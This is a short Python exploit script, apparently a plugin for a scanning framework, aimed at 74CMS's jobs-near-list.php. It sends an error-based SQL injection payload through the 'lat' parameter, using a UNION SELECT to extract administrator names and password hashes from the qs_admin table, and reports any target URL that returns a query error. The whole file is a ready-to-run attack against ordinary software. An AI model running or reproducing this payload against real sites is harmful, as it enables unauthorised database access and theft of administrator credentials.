#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/m/jobs-near-list.php?act=ajaxjobsnearlist&pic1=1&lat=123123*PI()/180-map_y*PI()/180)/2),2)%2bCOS(321321*PI()/180)*COS(map_y*PI()/180)*POW(SIN((123123*PI()/180-map_x*PI()/180)/2),2)))*1000)  FROM qs_jobs_search_key   WHERE `'`.``.id=1  union select concat(0x27,concat(admin_name,pwd)),2 from qs_admin%23&lng=123&key='"
bug ="Query error:SELECT"
info ="74CMS jobs-near-list.php 报错注入"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);

main()
